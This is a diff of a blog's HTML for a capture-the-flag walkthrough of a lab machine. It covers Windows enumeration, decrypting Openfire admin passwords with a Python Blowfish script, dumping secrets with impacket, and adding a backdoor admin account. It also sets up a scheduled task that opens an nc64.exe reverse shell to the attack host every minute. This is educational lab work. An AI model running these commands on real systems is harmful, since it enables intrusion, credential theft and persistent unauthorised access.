+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>whoami /groups; net localgroup <span style="color:#e6db74">&#34;Remote Desktop Users&#34;</span>; net localgroup <span style="color:#e6db74">&#34;Administrators&#34;</span>; net localgroup <span style="color:#e6db74">&#34;DNS Admins&#34;</span>; net localgroup <span style="color:#e6db74">&#34;Backup Operators&#34;</span>; net localgroup <span style="color:#e6db74">&#34;Print Operators&#34;</span>; net localgroup <span style="color:#e6db74">&#34;Server Operators&#34;</span>;  net localgroup <span style="color:#e6db74">&#34;Event Log Readers&#34;</span>; net localgroup <span style="color:#e6db74">&#34;Hyper-V Administrators&#34;</span>
 </span></span></code></pre></div><p>Again nothing of note, it does not appear any of the users are part of any interesting groups.</p>
 <h4 id="enumerating-installed-programs">Enumerating Installed Programs:</h4>
 <p>Let&rsquo;s see if there are any interesting programs that we have not looked at so far.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>(<span style="color:#e6db74">&#39;HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*&#39;</span>, <span style="color:#e6db74">&#39;HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&#39;</span>) | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation | sort-object -Property Displayname -Unique |Format-Table -AutoSize
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>(<span style="color:#e6db74">&#39;HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*&#39;</span>, <span style="color:#e6db74">&#39;HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&#39;</span>) | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation | sort-object -Property Displayname -Unique |Format-Table -AutoSize
 </span></span></code></pre></div><p>Nothing of note</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-21-142355_.png">
@@ -1710,7 +1710,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </ul>
 <h4 id="checking-path-and-env-s">Checking PATH and ENV&rsquo;s:</h4>
 <p>PATH</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$Env:PATH
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$Env:PATH
 </span></span></code></pre></div><p>There are some interesting things here like SSH and python so we can put a pin in these until we get stuck.</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-21-142632_.png">
@@ -1718,7 +1718,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </li>
 </ul>
 <p>Environmental Variables:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ChildItem Env<span style="color:#960050;background-color:#1e0010">:</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ChildItem Env<span style="color:#960050;background-color:#1e0010">:</span>
 </span></span></code></pre></div><p>Nothing of note</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-21-142756_.png">
@@ -1726,10 +1726,10 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </li>
 </ul>
 <h4 id="non-disabled-scheduled-tasks">Non-disabled Scheduled Tasks:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ScheduledTask | Where-Object { $_.State <span style="color:#f92672">-ne</span> <span style="color:#e6db74">&#39;Disabled&#39;</span> } | Select-Object TaskName, TaskPath, State
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ScheduledTask | Where-Object { $_.State <span style="color:#f92672">-ne</span> <span style="color:#e6db74">&#39;Disabled&#39;</span> } | Select-Object TaskName, TaskPath, State
 </span></span></code></pre></div><p>There was nothing of note here, however I will not show the output as it was pages.</p>
 <h4 id="running-processes">Running processes:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Command to exclude standard windows processes</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Command to exclude standard windows processes</span>
 </span></span><span style="display:flex;"><span>tasklist /svc | select-string -Pattern <span style="color:#e6db74">&#34;svchost.*|LSASS*|winlogon*|smss*|csrss*&#34;</span> <span style="color:#f92672">-NotMatch</span>
 </span></span></code></pre></div><p>It does show that <code>nginx.exe</code> is running which is to be expected as a webserver is running.</p>
 <ul>
@@ -1762,7 +1762,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </li>
 </ul>
 <h4 id="check-powershell-history">Check PowerShell History:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ChildItem -Path <span style="color:#e6db74">&#34;</span>$env:USERPROFILE<span style="color:#e6db74">\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&#34;</span> | Format-Table -AutoSize
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ChildItem -Path <span style="color:#e6db74">&#34;</span>$env:USERPROFILE<span style="color:#e6db74">\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&#34;</span> | Format-Table -AutoSize
 </span></span></code></pre></div><p>Nothing of note…well nothing actually.</p>
 <h4 id="openfire-db">Openfire DB</h4>
 <p>I look through the openfire folder structure and find there is a file called <code>openfire.script</code> located in <code>C:\Program Files\Openfire\embedded-db</code> initially it confused me as it just appears to be a list of SQL commands, however after some looking online we can find this entry on the <a href="https://discourse.igniterealtime.org/t/location-and-structure-of-embedded-db/57190"  target="_blank" rel="noreferrer nofollow">openfire discourse</a>
@@ -1773,9 +1773,9 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </li>
 </ul>
 <p>Looking through it we can find the below entry which appears to be the entry for the admin user &amp; what looks to be an hashed password.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> OFUSER <span style="color:#66d9ef">VALUES</span>(<span style="color:#e6db74">&#39;admin&#39;</span>,<span style="color:#e6db74">&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;</span>,<span style="color:#e6db74">&#39;9MwNQcJ9bF4YeyZDdns5gvXp620=&#39;</span>,<span style="color:#e6db74">&#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#39;</span>,<span style="color:#ae81ff">4096</span>,<span style="color:#66d9ef">NULL</span>,<span style="color:#e6db74">&#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39;</span>,<span style="color:#e6db74">&#39;Administrator&#39;</span>,<span style="color:#e6db74">&#39;admin@solarlab.htb&#39;</span>,<span style="color:#e6db74">&#39;001700223740785&#39;</span>,<span style="color:#e6db74">&#39;0&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> OFUSER <span style="color:#66d9ef">VALUES</span>(<span style="color:#e6db74">&#39;admin&#39;</span>,<span style="color:#e6db74">&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;</span>,<span style="color:#e6db74">&#39;9MwNQcJ9bF4YeyZDdns5gvXp620=&#39;</span>,<span style="color:#e6db74">&#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#39;</span>,<span style="color:#ae81ff">4096</span>,<span style="color:#66d9ef">NULL</span>,<span style="color:#e6db74">&#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39;</span>,<span style="color:#e6db74">&#39;Administrator&#39;</span>,<span style="color:#e6db74">&#39;admin@solarlab.htb&#39;</span>,<span style="color:#e6db74">&#39;001700223740785&#39;</span>,<span style="color:#e6db74">&#39;0&#39;</span>)
 </span></span></code></pre></div><p>Some further searching also reveals a password key.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> OFPROPERTY <span style="color:#66d9ef">VALUES</span>(<span style="color:#e6db74">&#39;passwordKey&#39;</span>,<span style="color:#e6db74">&#39;hGXiFzsKaAeYLjn&#39;</span>,<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">NULL</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> OFPROPERTY <span style="color:#66d9ef">VALUES</span>(<span style="color:#e6db74">&#39;passwordKey&#39;</span>,<span style="color:#e6db74">&#39;hGXiFzsKaAeYLjn&#39;</span>,<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">NULL</span>)
 </span></span></code></pre></div><p>After some searching online I found some old decryption tools however that&rsquo;s no fun so lets write one in python.</p>
 <h3 id="decrypting-openfire-passwords-with-python--understanding-the-mechanism">Decrypting Openfire Passwords with Python (Understanding the Mechanism)</h3>
 <p>I love these kinds of reverse engineering exercises. They’re gold for understanding how applications store and secure (or fail to secure) credentials. If you&rsquo;re familiar with Blowfish encryption or Openfire&rsquo;s password handling, you might want to skip ahead. But if you&rsquo;re not, or just want to level up your Python, this is for you.</p>
@@ -1784,7 +1784,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <p>Openfire encrypts passwords using the Blowfish cipher in CBC mode, and stores them hex-encoded with a prepended IV (Initialization Vector). This means if we’ve got the key and the encoded password, we can decrypt it, we just need to replicate Openfire’s process.</p>
 <p>This is useful for recovering credentials from old backups, reversing malware configs using Openfire, or (you know)…. offensive research.</p>
 <p>Here’s the core decryptor logic we’re going to walk through.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> Blowfish
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Hash <span style="color:#f92672">import</span> SHA1
@@ -1819,7 +1819,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </span></span></code></pre></div><h4 id="let-s-break-it-down">Let’s Break it Down:</h4>
 <p>Each part of this script mimics something Openfire does internally, step by step.</p>
 <h5 id="importing-libraries">Importing Libraries:</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> Blowfish
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> Blowfish
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Hash <span style="color:#f92672">import</span> SHA1
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
 </span></span></code></pre></div><ul>
@@ -1829,39 +1829,39 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </ul>
 <p>These are all standard and widely used in Python crypto work — no weird dependencies here.</p>
 <h5 id="creating-the-encryption-key">Creating the Encryption Key:</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sha1_key <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(key<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sha1_key <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(key<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()
 </span></span></code></pre></div><p>The original key is not used directly — it’s hashed using <code>SHA-1</code> to derive a 20-byte key, which is what Openfire expects. The <code>.digest()</code> returns the raw bytes instead of a hex string.</p>
 <p>This mimics in java:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>MessageDigest sha1 <span style="color:#f92672">=</span> MessageDigest.<span style="color:#a6e22e">getInstance</span>(<span style="color:#e6db74">&#34;SHA-1&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>MessageDigest sha1 <span style="color:#f92672">=</span> MessageDigest.<span style="color:#a6e22e">getInstance</span>(<span style="color:#e6db74">&#34;SHA-1&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> key <span style="color:#f92672">=</span> sha1.<span style="color:#a6e22e">digest</span>(passphrase.<span style="color:#a6e22e">getBytes</span>());
 </span></span></code></pre></div><h5 id="parsing-the-encrypted-password">Parsing the Encrypted Password:</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ciphertext_bytes <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(ciphertext_hex)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ciphertext_bytes <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(ciphertext_hex)
 </span></span></code></pre></div><p>Openfire stores the encrypted string in hex. We decode it to raw bytes using <code>unhexlify</code>.</p>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#34;f4b5f7...&#34;</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf4\xb5\xf7</span><span style="color:#e6db74">...&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#34;f4b5f7...&#34;</span>  <span style="color:#960050;background-color:#1e0010">→</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf4\xb5\xf7</span><span style="color:#e6db74">...&#34;</span>
 </span></span></code></pre></div><h5 id="extracting-the-iv">Extracting the IV:</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>iv <span style="color:#f92672">=</span> ciphertext_bytes[:<span style="color:#ae81ff">8</span>]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>iv <span style="color:#f92672">=</span> ciphertext_bytes[:<span style="color:#ae81ff">8</span>]
 </span></span><span style="display:flex;"><span>ciphertext <span style="color:#f92672">=</span> ciphertext_bytes[<span style="color:#ae81ff">8</span>:]
 </span></span></code></pre></div><p>The IV (initialization vector) is the first 8 bytes of the ciphertext. Blowfish in CBC mode always needs a random IV to prevent repeatable ciphertext, but Openfire conveniently stores the IV in front of the encrypted content.</p>
 <h5 id="decrypting-the-ciphertext">Decrypting the Ciphertext:</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> Blowfish<span style="color:#f92672">.</span>new(sha1_key, Blowfish<span style="color:#f92672">.</span>MODE_CBC, iv)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> Blowfish<span style="color:#f92672">.</span>new(sha1_key, Blowfish<span style="color:#f92672">.</span>MODE_CBC, iv)
 </span></span><span style="display:flex;"><span>decrypted <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(ciphertext)
 </span></span></code></pre></div><p>We create the cipher using the SHA-1-derived key and the IV, then decrypt the ciphertext.</p>
 <h5 id="removing-padding">Removing Padding:</h5>
 <p>Blowfish has a block size of 8 bytes, so padding is likely used.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    pad_len <span style="color:#f92672">=</span> decrypted[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    pad_len <span style="color:#f92672">=</span> decrypted[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> decrypted[:<span style="color:#f92672">-</span>pad_len]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
 </span></span></code></pre></div><p>Openfire pads the plaintext to match the block size — so we strip trailing null-bytes <code>\x00s</code> before decoding it as a <code>UTF-8</code> string.</p>
 <p>As an example this line turns:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;mypassword</span><span style="color:#ae81ff">\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#e6db74">&#34;mypassword&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;mypassword</span><span style="color:#ae81ff">\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#e6db74">&#34;mypassword&#34;</span>
 </span></span></code></pre></div><h5 id="provide-ciphertext-and-key">Provide ciphertext &amp; key:</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ciphertext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ciphertext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#34;</span>
 </span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hGXiFzsKaAeYLjn&#34;</span>
 </span></span><span style="display:flex;"><span>print(decrypt_openfire_pass(encrypted, key))
 </span></span></code></pre></div><p>This would print the decrypted password stored in Openfire, assuming we have got the key right…..</p>
 <h4 id="creating-a-venv-to-run-it-in">Creating a <code>venv</code> to run it in:</h4>
 <p>Now that we have our script we need to install one dependency, <code>pycrptodome</code>, to avoid messing up our base python installation lets create a virtual environment.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Create the venv</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Create the venv</span>
 </span></span><span style="display:flex;"><span>python -m venv openfire-decrypt
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Activate it</span>
@@ -1876,7 +1876,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </ul>
 <h4 id="decrypting-the-found-password">Decrypting the found password:</h4>
 <p>If we run the decryption tool we should now get the password</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 openfiredecrypt.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 openfiredecrypt.py
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-21-162145_.png">
 </figure>
@@ -1891,7 +1891,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </ul>
 <h3 id="using-impacket-psexec-to-get-an-nt-authority-shell">Using <code>impacket-psexec</code> to get an <code>NT/Authority</code> shell:</h3>
 <p>As there are no other means to connect, let&rsquo;s use <code>impacket-psexec</code> to access the host.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-psexec $user@$box
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-psexec $user@$box
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-21-162726_.png">
 </figure>
@@ -1909,7 +1909,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <ul>
 <li>+Note+: I know this is kind of redundant as if they were to change the administrator password we would still be locked out….</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-secretsdump $user:$pass@$box
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-secretsdump $user:$pass@$box
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-21-163700_.png">
 </figure>
@@ -1917,7 +1917,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </ul>
 <h3 id="making-a-new-admin-user">Making a new admin user:</h3>
 <p>Let&rsquo;s make a new admin user to be safe.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">#Add the new user</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">#Add the new user</span>
 </span></span><span style="display:flex;"><span>net user bloodstiller bl00dst1ll3r! /add
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Add the user to local admin</span>
 </span></span><span style="display:flex;"><span>net localgroup Administrators bloodstiller /add
@@ -1940,7 +1940,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <h5 id="version-1-using-nc64-dot-exe-to-connect-back-to-our-attack-host-periodically">Version 1: Using <code>nc64.exe</code> to connect back to our attack host periodically:</h5>
 <p>First we need to transfer <code>nc64.exe</code> binary over.</p>
 <p>We can create the scheduled task backdoor using <code>schtasks</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>schtasks /create /tn BackDoor /tr <span style="color:#e6db74">&#34;C:\Users\Administrator\Documents\nc64.exe  10.10.14.31 6666 -e powershell&#34;</span> /sc minute /mo <span style="color:#ae81ff">1</span> /ru System
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>schtasks /create /tn BackDoor /tr <span style="color:#e6db74">&#34;C:\Users\Administrator\Documents\nc64.exe  10.10.14.31 6666 -e powershell&#34;</span> /sc minute /mo <span style="color:#ae81ff">1</span> /ru System
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-22-071157_.png">
 </figure>
@@ -2031,7 +2031,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <p>We can use a base64 obfuscated powershell reverse shell. I like using <a href="https://revshells.com"  target="_blank" rel="noreferrer nofollow">https://revshells.com</a>
  for this</p>
 <p><strong>We then need to create our scheduled task</strong>:</p>
